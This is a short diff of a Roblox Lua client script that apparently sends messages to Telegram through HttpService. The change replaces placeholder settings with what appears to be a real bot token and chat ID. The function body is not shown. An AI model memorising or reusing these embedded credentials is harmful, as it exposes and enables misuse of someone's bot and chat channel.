@@ -5,8 +5,8 @@ local player = game.Players.LocalPlayer
 local httpService = game:GetService("HttpService")
 
 -- НАСТРОЙКИ (замените на свои)
-local TELEGRAM_BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"  -- Например: "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
-local TELEGRAM_CHAT_ID = "ВАШ_ID_ЧАТА"       -- Например: "-1001234567890"
+local TELEGRAM_BOT_TOKEN = "8816022777:AAEFzl_Ca2XkfKmuicex6HAWgYvILWIwizM"  -- Например: "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
+local TELEGRAM_CHAT_ID = "-5184530008"       -- Например: "-1001234567890"
 
 -- Функция отправки в Telegram
 local function sendToTelegram(message)
